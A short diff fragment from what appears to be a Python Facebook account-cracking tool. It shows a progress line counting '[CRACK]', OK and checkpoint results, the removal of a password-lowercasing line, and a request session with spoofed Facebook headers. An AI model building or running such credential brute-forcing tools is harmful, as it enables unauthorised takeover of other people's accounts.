@@ -855,7 +855,7 @@ sys.stdout.write(
 			"\r [+]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		
-			pw = pw.lower()
+			
 			ses = requests.Session()
 			headers = {
 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
